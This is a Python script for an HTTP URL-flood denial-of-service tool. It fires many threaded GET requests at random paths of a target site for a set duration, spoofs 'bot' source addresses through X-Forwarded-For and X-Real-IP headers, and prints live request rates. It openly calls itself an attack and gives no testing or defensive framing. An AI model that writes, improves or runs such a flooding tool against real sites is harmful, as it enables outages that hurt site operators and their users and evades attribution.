import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import random
import sys

RED = '\033[91m'
GRAY = '\033[90m'
RESET = '\033[0m'

stop_attack = False

def send_request(target, thread_id, delay, user_agent, bot_ip=None):
    """Send requests to random URLs on target"""
    global stop_attack
    if stop_attack:
        return

    base_url = target if target.startswith("http") else f"http://{target}"

    paths = [
        "/",
        "/index.html",
        "/login",
        "/admin",
        "/api",
        "/search",
        "/user",
        "/contact",
        "/about",
        "/products",
        "/cart"
    ]

    headers = {'User-Agent': user_agent}

    # Simulate bot IP by adding X-Forwarded-For header
    if bot_ip:
        headers['X-Forwarded-For'] = bot_ip
        headers['X-Real-IP'] = bot_ip

    url = base_url + random.choice(paths)
    try:
        response = requests.get(url, headers=headers, timeout=2, allow_redirects=False, stream=True)
        return True
    except:
        return False

def start_attack(target, settings, bots=None):
    """Start URL flood attack"""
    global stop_attack
    stop_attack = False

    duration = settings['duration']
    threads = settings['threads']
    delay = settings.get('delay', 0)
    user_agent = settings.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')

    # Use bots if provided, otherwise use threads count
    bot_count = len(bots) if bots else 0
    effective_threads = max(threads, bot_count) if bot_count > 0 else threads

    print(f"  Target: {target}")
    print(f"  Duration: {duration}s")
    print(f"  Threads: {threads}")
    print(f"  Active Bots: {bot_count}")
    print(f"  Total Workers: {effective_threads}")
    print(f"  Delay: {delay}ms")
    print(f"  User-Agent: {user_agent[:50]}..." if len(user_agent) > 50 else f"  User-Agent: {user_agent}", end='')
    print("  " + "-" * 45)
    print(f"  {GRAY}Press Ctrl+C to stop attack{RESET}")
    print()

    start_time = time.time()
    sent_requests = 0
    successful_requests = 0
    last_update = start_time
    last_count = 0
    futures = []

    def worker():
        nonlocal sent_requests, successful_requests
        while not stop_attack and (time.time() - start_time) < duration:
            # Pick random bot IP if available
            bot_ip = None
            if bots and len(bots) > 0:
                bot = random.choice(bots)
                bot_ip = bot.get('ip')
            if send_request(target, threading.current_thread().ident, delay, user_agent, bot_ip):
                successful_requests += 1
            sent_requests += 1
            time.sleep(0.01)

    try:
        executor = ThreadPoolExecutor(max_workers=effective_threads)
        for _ in range(effective_threads):
            futures.append(executor.submit(worker))

        while not stop_attack and (time.time() - start_time) < duration:
            time.sleep(0.5)
            elapsed = time.time() - start_time
            if elapsed - last_update >= 1:
                interval = elapsed - last_update
                rps = (sent_requests - last_count) / max(interval, 0.001)
                last_count = sent_requests
                last_update = elapsed
                print(f"  {GRAY}Sent: {sent_requests} | Success: {successful_requests} | Time: {elapsed:.1f}s | RPS: {rps:.1f} | Bots: {bot_count}{RESET}", end='\r')

        stop_attack = True
        for future in futures:
            future.cancel()
        executor.shutdown(wait=False)

    except KeyboardInterrupt:
        stop_attack = True
        print(f"\n  {RED}Attack stopped by user{RESET}")
        for future in futures:
            future.cancel()
        executor.shutdown(wait=False)

    elapsed = time.time() - start_time
    avg_rps = sent_requests / elapsed if elapsed > 0 else 0
    print()
    print("  " + "-" * 45)
    print(f"  Attack completed!")
    print(f"  Total requests sent: {sent_requests}")
    print(f"  Elapsed time: {elapsed:.2f}s")
    print(f"  Average RPS: {avg_rps:.2f}")
